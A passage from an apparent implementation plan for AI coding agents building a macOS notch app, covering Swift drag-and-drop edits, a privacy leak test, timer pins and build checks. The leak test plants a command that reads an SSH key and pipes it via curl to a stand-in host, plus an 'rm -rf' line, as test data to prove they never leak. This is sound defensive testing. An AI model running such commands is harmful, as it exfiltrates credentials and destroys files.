        guard !isOwnDrag(sender) else { return [] }
        let kinds = ShelfDropReader.kinds(of: sender.draggingPasteboard)
        guard ShelfDrop.opensIsland(kinds) else { return [] }
        onDragEntered?(sender.draggingLocation)
        return operation(sender, kinds: kinds)
    }
    override func draggingUpdated(_ sender: NSDraggingInfo) -> NSDragOperation {
        guard !isOwnDrag(sender) else { return [] }
        let kinds = ShelfDropReader.kinds(of: sender.draggingPasteboard)
        guard ShelfDrop.opensIsland(kinds) else { return [] }
        onDragUpdated?(sender.draggingLocation)
        return operation(sender, kinds: kinds)
    }
    override func draggingExited(_ sender: NSDraggingInfo?) { onDragExited?() }

```

Replace with:

```swift
    override func draggingEntered(_ sender: NSDraggingInfo) -> NSDragOperation {
        guard !isOwnDrag(sender) else { return [] }
        let kinds = ShelfDropReader.kinds(of: sender.draggingPasteboard)
        guard ShelfDrop.opensIsland(kinds) else { return [] }
        if kinds.contains(.fileURL), let pill = agentCatAt?(sender.draggingLocation) { setOverAgentCat(pill); return .copy }   // an agent's own cat: the drop view does not open for it
        zoneEntered = true
        onDragEntered?(sender.draggingLocation)
        return operation(sender, kinds: kinds)
    }
    override func draggingUpdated(_ sender: NSDraggingInfo) -> NSDragOperation {
        guard !isOwnDrag(sender) else { return [] }
        let kinds = ShelfDropReader.kinds(of: sender.draggingPasteboard)
        guard ShelfDrop.opensIsland(kinds) else { return [] }
        if kinds.contains(.fileURL), let pill = agentCatAt?(sender.draggingLocation) { setOverAgentCat(pill); return .copy }
        setOverAgentCat(nil)
        // The pointer left an agent's cat: the drop view opens now, as it would have at the start.
        if !zoneEntered { zoneEntered = true; onDragEntered?(sender.draggingLocation) }
        onDragUpdated?(sender.draggingLocation)
        return operation(sender, kinds: kinds)
    }
    override func draggingExited(_ sender: NSDraggingInfo?) {
        setOverAgentCat(nil)
        if zoneEntered { zoneEntered = false; onDragExited?() }
    }

```

**Edit `NotchBuddy/Sources/App/FileDropView.swift`** (the find text occurs exactly once)

Find:

```swift
        let half = halfAt?(sender.draggingLocation) ?? .ask

```

Replace with:

```swift
        // A drop on an agent's own cat hands over a path, not the file: ruled before the Ask and Shelf halves (the big cat's drop is not touched).
        if kinds.contains(.fileURL), let pill = agentCatAt?(sender.draggingLocation),
           let urls = sender.draggingPasteboard.readObjects(forClasses: [NSURL.self], options: [.urlReadingFileURLsOnly: true]) as? [URL], !urls.isEmpty {
            setOverAgentCat(nil)
            zoneEntered = false
            onAgentDrop?(urls, pill)
            return true
        }
        let half = halfAt?(sender.draggingLocation) ?? .ask

```

**Edit `NotchBuddy/Sources/App/IslandWindowController.swift`** (the find text occurs exactly once)

Find:

```swift
            }
        }

        container.addSubview(hosting)    // z-bottom: SwiftUI + mouse events
```

Replace with:

```swift
            }
        }
        // A drop on an agent's own cat (sub-project F1) is consulted first by every drag callback: the grid's cats in A cat for each agent mode and cat 2 in Two cats mode, never the big cat.
        dropView.agentCatAt = { [weak self] loc in self?.sidekickAgentCat(at: loc) }
        dropView.onAgentDragOver = { pill in AppState.shared.sidekickDropPill = pill }
        dropView.onAgentDrop = { urls, pill in SidekickDropApp.handoff(urls: urls, pillId: pill) }

        container.addSubview(hosting)    // z-bottom: SwiftUI + mouse events
```

**Edit `NotchBuddy/Sources/App/IslandWindowController.swift`** (the find text occurs exactly once)

Find:

```swift
        islandPanel.makeKey()
        expand(to: view)
    }

```

Replace with:

```swift
        islandPanel.makeKey()
        expand(to: view)
    }

    /// The agent whose own cat is under a drag (`loc` is in the panel's window), with a live session; nil for everything else, so the drop is what it always was.
    private func sidekickAgentCat(at loc: CGPoint) -> String? {
        SidekickDropApp.agentCat(atWindowPoint: loc, panelWidth: Double(window?.frame.width ?? 720), panelHeight: Double(window?.frame.height ?? 320), live: Sidekick.shared.liveAgents)
    }

```

**Edit `NotchBuddy/Sources/App/AppState.swift`** (the find text occurs exactly once)

Find:

```swift
    @Published var fileDragOver: Bool = false
    /// The half of the open island the dragged files are over (sub-project G1)
```

Replace with:

```swift
    @Published var fileDragOver: Bool = false
    /// The agent whose own cat a dragged file is over (sub-project F1): the grid cat or cat 2 draws a thin ring while it is. nil the rest of the time.
    @Published var sidekickDropPill: String? = nil
    /// The half of the open island the dragged files are over (sub-project G1)
```

- [ ] **Step 7: Ring the cat the pointer is on, and let the agent's cat answer with its emote**

A drag over an agent's cat draws a thin white ring around it (so the owner can see the drop will go to that agent), and the cat gives the happy emote after the drop. Both are additive: nothing that ships looks different unless a file is dragged over one of these cats.

**Edit `NotchBuddy/Sources/App/IslandRootView.swift`** (the find text occurs exactly once)

Find:

```swift
                    .frame(width: 12 / 0.6, height: 12 / 0.6)
                    .frame(width: 12, height: 12, alignment: .center)
            }
        }
```

Replace with:

```swift
                    .frame(width: 12 / 0.6, height: 12 / 0.6)
                    .frame(width: 12, height: 12, alignment: .center)
                    .overlay { if state.sidekickDropPill == other.task.id { Circle().stroke(Color.white.opacity(0.85), lineWidth: 1.2).frame(width: 15, height: 15) } }   // a file is over this agent's cat
            }
        }
```

**Edit `NotchBuddy/Sources/App/PairCatViews.swift`** (the find text occurs exactly once)

Find:

```swift
            PairCatCanvasView(state: state, task: task, cat: second.cat, compact: place.compact, centre: CGPoint(x: place.cx, y: place.cy), islandW: islandW)
                .frame(width: canvas, height: canvas)
                .position(x: place.cx, y: place.cy)
                .animation(.spring(response: 0.5, dampingFraction: 0.72), value: place.cx)
```

Replace with:

```swift
            PairCatCanvasView(state: state, task: task, cat: second.cat, compact: place.compact, centre: CGPoint(x: place.cx, y: place.cy), islandW: islandW)
                .frame(width: canvas, height: canvas)
                .overlay { if let id = task?.id, state.sidekickDropPill == id { Circle().stroke(Color.white.opacity(0.85), lineWidth: 1.5).frame(width: place.d * 1.15, height: place.d * 1.15) } }   // a file is over this agent's cat
                .position(x: place.cx, y: place.cy)
                .animation(.spring(response: 0.5, dampingFraction: 0.72), value: place.cx)
```

**Edit `NotchBuddy/Sources/App/PairCatViews.swift`** (the find text occurs exactly once)

Find:

```swift
                }
            }
        }
    }
}

```

Replace with:

```swift
                }
            }
        }
        // A file dropped on this agent's cat: the cat is happy.
        .onReceive(NotificationCenter.default.publisher(for: .sidekickCatEmote)) { note in
            if let id = task?.id, (note.object as? String) == id { engine.triggerEmote(.happy) }
        }
    }
}

```

**Edit `NotchBuddy/Sources/App/BotCanvasView.swift`** (the find text occurs exactly once)

Find:

```swift
            engine.setState(task.state.shown(asleep: AppState.shared.catAsleep), force: true)
        }
    }
}
```

Replace with:

```swift
            engine.setState(task.state.shown(asleep: AppState.shared.catAsleep), force: true)
        }
        // A file dropped on this agent's cat: the cat is happy.
        .onReceive(NotificationCenter.default.publisher(for: .sidekickCatEmote)) { note in
            if (note.object as? String) == task.id { engine.triggerEmote(.happy) }
        }
    }
}
```

- [ ] **Step 8: Run the tests and the build**

Run: `for s in test-sidekick-drop test-sidekick-wiring test-cat-wiring test-cat-upload test-island-wing-wiring test-cat-desktop-drop test-cat-desktop-wiring test-hook-origin-wiring; do printf '%-34s' $s; bash scripts/$s.sh 2>&1 | tail -1; done`
Expected: eight lines, each `All tests passed.`

```bash
cd NotchBuddy && xcodegen > /dev/null && cd .. && xcodebuild -project NotchBuddy/NotchBuddy.xcodeproj -scheme NotchBuddy -configuration Debug -derivedDataPath NotchBuddy/build build CODE_SIGNING_ALLOWED=NO 2>&1 | tail -3
```

Expected: `** BUILD SUCCEEDED **`.

- [ ] **Step 9: Commit**

```bash
git rev-parse --show-toplevel && git branch --show-current   # the worktree's folder and f1/mac-sidekick: stop if either is wrong
MSG="$(mktemp "${TMPDIR:-/tmp}/f1-mac-msg.XXXXXX")"
cat > "$MSG" <<'EOF'
feat(sidekick): drop a file on an agent's own cat: copy its path and bring the agent forward

Only an agent's cat in the grid (A cat for each agent) or cat 2 (Two cats), with a live session, takes a path: it is copied, never pasted, and the agent's app comes forward by the pill's own routes. The test runs first in every drag callback; the big cat and every other drop are as they were.

Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>
EOF
git add NotchBuddy/Sources/App/SidekickDrop.swift NotchBuddy/Sources/App/SidekickDropApp.swift NotchBuddy/Sources/App/FileDropView.swift NotchBuddy/Sources/App/IslandWindowController.swift NotchBuddy/Sources/App/AppState.swift NotchBuddy/Sources/App/IslandRootView.swift NotchBuddy/Sources/App/PairCatViews.swift NotchBuddy/Sources/App/BotCanvasView.swift tests/SidekickDropTests.swift scripts/test-sidekick-drop.sh tests/SidekickWiringTests.swift NotchBuddy/NotchBuddy.xcodeproj/project.pbxproj
git commit -F "$MSG"
```

---

### Task 19: Privacy and parity: the leak test, the CPU pins and the same sidekick in every build

**Agent:** `nm-implementer` (Haiku 5.5, high). A security and privacy task: the **leak test** is the proof the spec asks for, so a failure here is a stop, not a fix-up, and the final review (`nm-reviewer-deep`) reads this task first.

**Files:**
- Create: `tests/SidekickLeakTests.swift`, `scripts/test-sidekick-leak.sh`
- Modify: `scripts/check-app-binary.sh`, `tests/SidekickWiringTests.swift`

**Interfaces:**
- Consumes: Task 8's `SidekickVoiceLocal`, Task 9's `SidekickEngine`, Task 1's `SidekickExplain`, the AI core (`ModelProvider`, `ChatRequest`, `Conversation`, `AILog`), `tests/CatSettingsSupport.swift` (`MemoryBacking`).
- Produces: the leak test (`scripts/test-sidekick-leak.sh`), the binary check's `NM_SIDEKICK_ENGINE_PRESENT` (the marker is `Sidekick.marker`, in `Sidekick.swift` since Task 10 and used as the note view's accessibility identifier since Task 13, so a Release build cannot drop it as unused), the wiring pins for the timers and for the builds.

**The leak test.** A marker word (`ZEBRAQUOKKA-F1-9`) is planted in everything a hook can carry: the prompt, a parent folder of the project (`/Users/<marker>/proj`), a command, a tool's output, a file's contents, the assistant's last message and the transcript path. Then the whole sidekick runs: a recap after a lock, with the local voice offered a model among a local server, one on the network and a cloud model (**fakes that record every request**), a nudge for a loop, the line under a permission request, and a status answer. The test asserts: **1.** the marker is in no log line and the sidekick wrote none (the AI log's sink and the log folder of the test are both empty of it); **2.** nothing the sidekick says, remembers or hands out holds the marker, a command or a path (the notes, the lines and the facts, the ledger, the status answer); **3.** the cloud fake and the network fake received no request at all; **4.** the local fake received exactly one request, one user message with one text part, holding the template's own line and nothing else; **5.** the status answer is not in the conversation the chat holds (the chat's send path is modelled in the test; the wiring test pins the real one: Task 17).

**The pins.** The sidekick starts no repeating timer, display link or sleeping loop anywhere; the one clock is its only deadline timer (one wall-clock one-shot in `Sidekick.swift`; the island's fold after a drop's line is the only other delayed call; `Task.sleep` appears only in the local voice's six-second wait inside a request that exists); the clock is set from one place, `evaluate`, and the engine's tests have already proved it is not set while nothing runs. And it is the same sidekick in every build: it carries a marker (`NM_SIDEKICK_ENGINE_PRESENT`, longer than 15 bytes on purpose: Swift keeps a shorter string inside the code, where `strings` cannot see it, and referenced by the note's view, because the Release build drops a constant nothing uses; the dry run's first Release binary lacked it) that `check-app-binary.sh` now looks for in the Debug, Release and App Store binaries, only two small blocks of its app side are behind `#if` (Codex off in the App Store build; a chat's approval card exists only in the GitHub build), and the terminal routes keep `AgentTarget`'s four `#if !APPSTORE` blocks, so the App Store build keeps its existing limits: it copies the path and brings VS Code forward, and nothing more.

- [ ] **Step 1: Write the failing test**

**Create `tests/SidekickLeakTests.swift`**

```swift
import Foundation

// The leak test: a marker word is planted in everything the agents' hooks can carry (a command, a prompt, a parent folder of the project, an assistant message, a tool's output, a file's contents and a
// transcript path), the whole sidekick runs (a recap after a lock, a nudge for a loop, the line under a permission request, a status answer and a local polish) and the test proves what the spec promises:
//   1. the marker is in no log line, and the sidekick wrote no log line at all (no command and no path in any log);
//   2. nothing the sidekick says, remembers or hands out holds the marker, a command or a path: the notes, the lines, the facts, the ledger, the status answer;
//   3. the cloud fake provider received no request at all, and neither did the network one;
//   4. the local fake provider got exactly one request, and it holds only the template's own words, never the marker;
//   5. the status answer is not in the conversation the chat holds (the chat's send path, modelled here, returns before the conversation; the wiring test pins the real one).
// Run through scripts/test-sidekick-leak.sh. It compiles the AI core and the sidekick's files and no app.

final class Box<V: Sendable>: @unchecked Sendable {
    private let lock = NSLock()
    private var items: [V] = []
    func add(_ v: V) { lock.withLock { items.append(v) } }
    var all: [V] { lock.withLock { items } }
}

struct RecordingProvider: ModelProvider {
    let id: AIProviderID
    let placement: AIPlacement
    let seen: Box<ChatRequest>
    let reply: String
    var displayName: String { "recording \(placement.rawValue)" }
    func listModels() async throws -> [ModelInfo] { [] }
    func stream(_ request: ChatRequest) -> AsyncThrowingStream<ChatChunk, Error> {
        seen.add(request)
        let text = reply
        return AsyncThrowingStream { c in c.yield(.text(text)); c.yield(.finish(.stop)); c.finish() }
    }
}

@main
enum SidekickLeakTests {
    static let marker = "ZEBRAQUOKKA-F1-9"

    @MainActor final class World {
        var t = 10_000_000.0
        var presented: [SKNote] = []
        var timers: [(id: Int, at: Double, fire: @MainActor @Sendable () -> Void)] = []
        var next = 0
        func schedule(_ after: Double, _ fire: @escaping @MainActor @Sendable () -> Void) -> SidekickClock.Cancel {
            next += 1; let id = next
            timers.append((id, t + after, fire))
            return { [self] in MainActor.assumeIsolated { timers.removeAll { $0.id == id } } }
        }
        func advance(_ ms: Double) {
            let end = t + ms
            while let d = timers.filter({ $0.at <= end }).min(by: { $0.at < $1.at }) { timers.removeAll { $0.id == d.id }; t = max(t, d.at); d.fire() }
            t = end
        }
    }

    static func hook(_ name: String, _ extra: [String: Any] = [:]) -> [String: Any] {
        var p: [String: Any] = ["hook_event_name": name, "session_id": "S1", "cwd": "/Users/\(marker)/proj", "transcript_path": "/Users/me/.claude/projects/\(marker).jsonl", "term_program": "vscode"]
        for (k, v) in extra { p[k] = v }
        return p
    }

    @MainActor static func main() async {
        let logs = Box<String>()
        AILog.sink.replace { logs.add($0) }
        let sec = 1000.0, min = 60_000.0

        // The fakes: a local server, a server on the network and a cloud model, each recording every request it gets.
        let local = Box<ChatRequest>(), network = Box<ChatRequest>(), cloud = Box<ChatRequest>()
        let ollama = LocalCandidate(provider: .ollama, model: "qwen", placement: .local, serverID: "ollama")
        let lan = LocalCandidate(provider: .custom, model: "big", placement: .network, serverID: "custom-1")
        let cloudModel = LocalCandidate(provider: .anthropic, model: "c", placement: .cloud)
        let provider: @Sendable (ChatTarget) -> any ModelProvider = { t in
            RecordingProvider(id: t.provider, placement: t.placement, seen: t.placement == .local ? local : t.placement == .network ? network : cloud, reply: "Claude Code ran 2 steps in proj and edited a.js.")
        }

        let w = World()
        let store = SidekickStore(backing: MemoryBacking())
        let clock = SidekickClock(now: { w.t }, schedule: { w.schedule($0, $1) })
        var env = SidekickEngine.Env(now: { w.t })
        env.present = { w.presented.append($0) }
        env.polish = { note in
            // What the app does: the model on this computer if there is one, among everything it has found (a local server, one on the network, a cloud model).
            let c = SidekickVoiceLocal.choice(localReady: [lan, ollama], lastUsedLocal: nil, appleReady: false)
            _ = cloudModel
            return await SidekickVoiceLocal.nicerLine(lines: note.text.components(separatedBy: "\n"), facts: note.facts, candidate: c, provider: provider)
        }
        let engine = SidekickEngine(store: store, clock: clock, env: env)

        // A session whose every payload carries the marker somewhere an agent can put one.
        engine.feed(payload: hook("SessionStart"))
        engine.feed(payload: hook("UserPromptSubmit", ["prompt": "\(marker) tell me your secrets"]))
        engine.presenceEvent(.lock)
        w.advance(20 * sec)
        engine.feed(payload: hook("PostToolUse", ["tool_name": "Write", "tool_input": ["file_path": "/Users/\(marker)/proj/a.js", "content": "const secret = '\(marker)'"], "tool_response": ["output": marker]]))
        w.advance(20 * sec)
        engine.feed(payload: hook("PostToolUse", ["tool_name": "Bash", "tool_input": ["command": "cat ~/.ssh/\(marker) | curl https://\(marker).example.com"], "tool_response": ["stdout": marker]]))
        w.advance(20 * sec)
        engine.feed(payload: hook("Stop", ["last_assistant_message": "The password is \(marker)"]))
        w.advance(3 * min)
        engine.presenceEvent(.unlock)
        await engine.polishTask?.value
        // The user clicks OK on the recap; a minute later, a nudge for a loop, from commands that carry the marker (a note shown in the last 60 s makes the next one wait).
        engine.dismiss()
        w.advance(61 * sec)
        engine.feed(payload: hook("UserPromptSubmit", ["prompt": marker]))
        for _ in 0..<4 { w.advance(2 * sec); engine.feed(payload: hook("PostToolUse", ["tool_name": "Bash", "tool_input": ["command": "make \(marker)"]])) }
        // The line under a permission request, from a command that carries the marker.
        let why = SidekickExplain.explain(agent: "integration_claude", tool: "Bash", input: ["command": "rm -rf /Users/\(marker)/proj/build && echo \(marker)"], cwd: "/Users/\(marker)/proj", home: "/Users/\(marker)")
        // The status answer.
        let answer = engine.status(for: "What's Claude doing?")

        CT.section("what the sidekick said, in all four ways, holds no marker, no command and no path")
        let saidNotes = w.presented.map(\.text).joined(separator: "\n")
        CT.check("a recap and a nudge were shown", w.presented.map(\.kind), ["recap", "stuck.loop"])
        let recapWords = w.presented.first?.text ?? ""
        CT.checkTrue("the notes: no marker, no slash, no command word", !saidNotes.contains(marker) && !saidNotes.contains("/") && !saidNotes.contains("curl") && !saidNotes.contains("make") && !saidNotes.contains("~"))
        CT.check("the permission line is a fixed sentence with a basename", "\(why.line.contains(marker)) \(why.line.contains("/")) \(why.target)", "false false build")
        let statusText = (answer?.lines ?? []).joined(separator: "\n") + "\(answer?.facts.map(\.json) ?? [])"
        CT.checkTrue("the status answer and its facts: no marker, no path", !statusText.contains(marker) && !statusText.contains("/Users"))
        let ledgerText = String(data: try! JSONSerialization.data(withJSONObject: engine.ledger.json), encoding: .utf8)!
        CT.checkTrue("the ledger: no marker anywhere, not in a key, a name or a hash input", !ledgerText.contains(marker) && !ledgerText.contains("password") && !ledgerText.contains("secret"))
        CT.checkTrue("the recap's words are the template's, with the project's basename", recapWords.hasPrefix("While you were away, Claude Code in proj ran"))

        CT.section("1. no log line holds the marker, and the sidekick wrote none")
        CT.check("the AI log has no line from the sidekick", logs.all, [])
        let dir = ProcessInfo.processInfo.environment["NM_LOG_DIR"] ?? ""
        let files = (try? FileManager.default.contentsOfDirectory(atPath: dir)) ?? []
        let written = files.compactMap { try? String(contentsOfFile: "\(dir)/\($0)", encoding: .utf8) }.joined()
        CT.checkTrue("the log folder of the test holds no marker and no command", !written.contains(marker) && !written.contains("curl") && !written.contains("make"))

        CT.section("2 and 3. no request reached a cloud or a network model")
        CT.check("the cloud fake got no request at all", cloud.all.count, 0)
        CT.check("the network fake got no request at all", network.all.count, 0)

        CT.section("4. the local fake got one request, with the template's words and nothing else")
        CT.check("exactly one request", local.all.count, 1)
        if let sent = local.all.first {
            let text = sent.messages.flatMap(\.parts).compactMap { p -> String? in if case .text(let t) = p { return t } else { return nil } }.joined(separator: "\n")
            CT.checkTrue("it holds the recap's own line", text.contains(recapWords.components(separatedBy: "\n")[0]))
            CT.checkTrue("and no marker, no path, no command", !text.contains(marker) && !text.contains("/") && !text.contains("curl") && !sent.system.contains(marker))
            CT.check("one message, one part, no tools, no web search", sent.messages.count == 1 && sent.messages[0].parts.count == 1 && sent.tools.isEmpty && !sent.webSearch, true)
        }

        CT.section("5. the status answer is not in the conversation the chat holds")
        var convo = Conversation()
        func chatSend(_ text: String) { if engine.status(for: text) != nil { return }; convo.addUser(text) }   // the chat's send path: the status question returns before the conversation
        chatSend("hello there")
        chatSend("What's Claude doing?")
        chatSend("status")
        chatSend("how do I write a loop in Swift?")
        CT.check("only the two real messages are in it", convo.turns.map(\.text), ["hello there", "how do I write a loop in Swift?"])
        CT.checkTrue("and none of the answer", !convo.turns.contains { $0.text.contains("Claude Code") })
        CT.finish()
    }
}
```

**Create `scripts/test-sidekick-leak.sh`**

```bash
#!/usr/bin/env bash
# Sidekick leak test: a marker word planted in a command, a prompt, a parent folder, an assistant message, a tool's output, a file's contents and a transcript path never reaches a log, a note, a line,
# a ledger, a status answer or a non-local provider; the local fake gets one request with the template's words only. Compiles the AI core and the sidekick's files (no app).
set -euo pipefail
cd "$(dirname "$0")/.."
TEST_DIR="$(mktemp -d "${TMPDIR:-/tmp}/notchmeow-sidekick-leak.XXXXXX")"
trap 'rm -rf "$TEST_DIR"' EXIT
export NM_LOG_DIR="$TEST_DIR/logs"   # tests never write to ~/Library/Logs
mkdir -p "$NM_LOG_DIR"

APP=NotchBuddy/Sources/App
swiftc -swift-version 6 \
    $APP/AI/Core/*.swift $APP/AppLog.swift \
    $APP/CatMath.swift $APP/CatPresets.swift $APP/CatGeometry.swift $APP/Personality.swift $APP/CatRules.swift $APP/CatSettings.swift \
    $APP/SidekickText.swift $APP/SidekickExplain.swift $APP/SidekickLedger.swift $APP/SidekickStuck.swift $APP/SidekickRecap.swift $APP/SidekickSettings.swift $APP/SidekickStore.swift \
    $APP/SidekickPresence.swift $APP/SidekickNotes.swift $APP/SidekickVoice.swift $APP/SidekickVoiceLocal.swift $APP/SidekickEngine.swift \
    tests/CatTestSupport.swift tests/CatSettingsSupport.swift tests/SidekickLeakTests.swift \
    -o "$TEST_DIR/sidekick-leak-tests"
"$TEST_DIR/sidekick-leak-tests"
```

Then make it executable: `chmod +x scripts/test-sidekick-leak.sh`

- [ ] **Step 2: Run it**

Run: `bash scripts/test-sidekick-leak.sh`
Expected: PASS at once, because every task before this one already keeps the promise: `All tests passed.` (16 `✓` lines under five headings). It is a test of a property of the whole, so it is written last. **Bite it, because a passing test that cannot fail is worth nothing:** `sed -i '' 's/let local = localReady.filter { $0.placement == .local }/let local = localReady/' NotchBuddy/Sources/App/SidekickVoiceLocal.swift && bash scripts/test-sidekick-leak.sh 2>&1 | grep -E "✗|failed"`. Expected: the voice no longer picks the local server (its first candidate is the network one, which the second guard refuses), so `✗ exactly one request` and `1 test(s) failed.` Undo it with `sed -i '' 's/let local = localReady$/let local = localReady.filter { $0.placement == .local }/' NotchBuddy/Sources/App/SidekickVoiceLocal.swift` and run the test again: `All tests passed.`

- [ ] **Step 3: Write the pins and the binary check**

**Edit `tests/SidekickWiringTests.swift`** (the find text occurs exactly once)

Find:

```swift
        CT.checkTrue("the engine is given the voice for a recap's words only, from the note's own text and facts", center.contains("env.polish = { note in await SidekickVoiceApp.nicer(lines: note.text.components(separatedBy: \"\\n\"), facts: note.facts) }") && count("polish(", in: source("SidekickEngine.swift")) >= 2)

        CT.section("a drop on an agent's own cat: the test runs first in every drag callback, the big cat is never a target, and nothing is pasted")
        let drop = source("FileDropView.swift"), dropApp = source("SidekickDropApp.swift"), pure = source("SidekickDrop.swift")
```

Replace with:

```swift
        CT.checkTrue("the engine is given the voice for a recap's words only, from the note's own text and facts", center.contains("env.polish = { note in await SidekickVoiceApp.nicer(lines: note.text.components(separatedBy: \"\\n\"), facts: note.facts) }") && count("polish(", in: source("SidekickEngine.swift")) >= 2)

        CT.section("0 % CPU when the island is hidden, and the same sidekick in every build")
        let sidekickFiles = ["Sidekick.swift", "SidekickEngine.swift", "SidekickNotes.swift", "SidekickPresence.swift", "SidekickStore.swift", "SidekickView.swift", "SidekickChat.swift", "SidekickDropApp.swift", "SidekickVoiceApp.swift", "SidekickVoiceLocal.swift", "PresenceMonitor.swift", "AgentTarget.swift"]
        CT.checkTrue("no repeating timer, no display link and no sleeping loop in any of the sidekick's files", sidekickFiles.allSatisfy { f in let t = code(source(f)); return !t.contains("Timer") && !t.contains("repeats") && !t.contains("makeTimerSource") && !t.contains("CADisplayLink") && !t.contains("usleep") && !t.contains("Thread.sleep") && !t.contains("scheduledTimer") })
        CT.checkTrue("the one clock is the only deadline timer: one wall-clock one-shot in Sidekick.swift, and the fold of the island after a drop's line is the only other delayed call", count("asyncAfter(wallDeadline:", in: code(source("Sidekick.swift"))) == 1 && count("asyncAfter", in: code(source("Sidekick.swift"))) == 1 && count("asyncAfter", in: code(source("SidekickDropApp.swift"))) == 1 && ["SidekickEngine.swift", "SidekickNotes.swift", "SidekickPresence.swift", "SidekickView.swift", "SidekickChat.swift", "PresenceMonitor.swift", "AgentTarget.swift"].allSatisfy { !code(source($0)).contains("asyncAfter") })
        CT.checkTrue("the only sleeping is the local voice's six-second wait inside a request that exists, and the clock is set from one place, `evaluate`", count("Task.sleep", in: code(source("SidekickVoiceLocal.swift"))) == 1 && sidekickFiles.filter { $0 != "SidekickVoiceLocal.swift" }.allSatisfy { !code(source($0)).contains("Task.sleep") } && count("clock.set(", in: code(source("SidekickEngine.swift"))) == 1 && source("SidekickEngine.swift").contains("clock.set(deadline())"))
        CT.checkTrue("the sidekick is in every build: it carries its marker, the binary check looks for it in Debug, Release and App Store, and only two small blocks of its app side are behind #if", center.contains("static let marker = \"NM_SIDEKICK_ENGINE_PRESENT\"") && source("../../../scripts/check-app-binary.sh").contains("has NM_SIDEKICK_ENGINE_PRESENT") && count("#if", in: center) == 2 && sidekickFiles.filter { !["Sidekick.swift", "AgentTarget.swift"].contains($0) }.allSatisfy { !source($0).contains("#if") })
        CT.checkTrue("what an agent's terminal does is the GitHub build's, as before: AgentTarget keeps its four #if !APPSTORE blocks, and Codex is off in the App Store build", count("            #if !APPSTORE\n", in: target) == 4 && center.contains("#if APPSTORE\n    static let codexEnabled = false"))

        CT.section("a drop on an agent's own cat: the test runs first in every drag callback, the big cat is never a target, and nothing is pasted")
        let drop = source("FileDropView.swift"), dropApp = source("SidekickDropApp.swift"), pure = source("SidekickDrop.swift")
```

**Edit `scripts/check-app-binary.sh`** (the find text occurs exactly once)

Find:

```bash
    echo "✓ The shelf is in this build"
fi
shelfpanel=0; has NM_SHELF_DEV_PANEL && shelfpanel=1
```

Replace with:

```bash
    echo "✓ The shelf is in this build"
fi
# The sidekick (sub-project F1) is in every build too: its app side carries this marker.
if [ -n "${2:-}" ]; then
    has NM_SIDEKICK_ENGINE_PRESENT || { echo "✗ the sidekick (NM_SIDEKICK_ENGINE_PRESENT) is missing from this build" >&2; exit 1; }
    echo "✓ The sidekick is in this build"
fi
shelfpanel=0; has NM_SHELF_DEV_PANEL && shelfpanel=1
```

- [ ] **Step 4: Run every test, then the three builds and their binary checks**

Run: `bash scripts/test-sidekick-wiring.sh 2>&1 | tail -1; bash scripts/check-test-logs.sh 2>&1 | tail -1`
Expected: `All tests passed.` and `✓ every log-writing test script sets NM_LOG_DIR`.

```bash
cd NotchBuddy && xcodegen > /dev/null && cd ..
xcodebuild -project NotchBuddy/NotchBuddy.xcodeproj -scheme NotchBuddy -configuration Debug -derivedDataPath NotchBuddy/build build CODE_SIGNING_ALLOWED=NO 2>&1 | tail -1
xcodebuild -project NotchBuddy/NotchBuddy.xcodeproj -scheme NotchBuddy -configuration Release -derivedDataPath NotchBuddy/build/release build CODE_SIGNING_ALLOWED=NO CODE_SIGNING_REQUIRED=NO 2>&1 | tail -1
xcodebuild -project NotchBuddy/NotchBuddy.xcodeproj -scheme NotchMeowAppStore -configuration Debug -derivedDataPath NotchBuddy/build/store build CODE_SIGNING_ALLOWED=NO CODE_SIGNING_REQUIRED=NO 2>&1 | tail -1
bash scripts/check-app-binary.sh NotchBuddy/build/Build/Products/Debug/NotchMeow.app debug
bash scripts/check-app-binary.sh NotchBuddy/build/release/Build/Products/Release/NotchMeow.app release
bash scripts/check-app-binary.sh "$(ls -d NotchBuddy/build/store/Build/Products/Debug/*.app | head -1)" appstore
```

Expected: three lines `** BUILD SUCCEEDED **`, then the three checks each print `✓ The desktop cat is in this build`, `✓ The shelf is in this build`, `✓ The sidekick is in this build` and their own line (`✓ The cat panel, the Claude Code engine and its override are in this Debug build`, `✓ No cat panel and no Claude Code override in this build; the Claude Code engine is in it`, `✓ No cat panel and no Claude Code engine in this build`) and the FoundationModels line. A build never starts: **do not open any app.**

- [ ] **Step 5: Commit**

```bash
git rev-parse --show-toplevel && git branch --show-current   # the worktree's folder and f1/mac-sidekick: stop if either is wrong
MSG="$(mktemp "${TMPDIR:-/tmp}/f1-mac-msg.XXXXXX")"
cat > "$MSG" <<'EOF'
test(sidekick): the leak test, the timer pins and the sidekick in every build

A marker planted in a command, a prompt, a parent folder, an assistant message, a tool's output, a file's contents and a transcript path never reaches a log, a note, a ledger, a status answer or a cloud or network model; the local fake gets one request with the template's words. The binary check looks for the sidekick in Debug, Release and App Store.

Co-Authored-By: Claude Haiku 5.5 <noreply@anthropic.com>
EOF
git add tests/SidekickLeakTests.swift scripts/test-sidekick-leak.sh NotchBuddy/Sources/App/Sidekick.swift scripts/check-app-binary.sh tests/SidekickWiringTests.swift
git commit -F "$MSG"
```

---

### Task 20: The owner's fake events, the docs and CI

**Agent:** `nm-implementer-light` (Haiku 5.5, medium). Given text and a script whose own test proves it.

**Files:**
- Create: `scripts/fake-sidekick-events.py`, `scripts/test-fake-sidekick-events.sh`
- Modify: `CLAUDE.md`, `ARCHITECT.md`, `README.md`, `docs/SPEC.md`, `docs/INTEGRATIONS.md`, `docs/QA-MAC.md`, `.github/workflows/build.yml`

**Interfaces:**
- Consumes: `tests/kitten_socket_server.py` (the stand-in for the app's socket, which answers `ok` and an immediate allow), every test script of Tasks 1 to 19.
- Produces: `scripts/fake-sidekick-events.py` (scenarios `loop`, `risk`, `waiting`, `away`, `quiet`, `all`, `end`; `--print`, `--sock`, `--speed`, `--minutes`, `--finish`, `--permission-timeout`), its test, and the docs and CI lines.

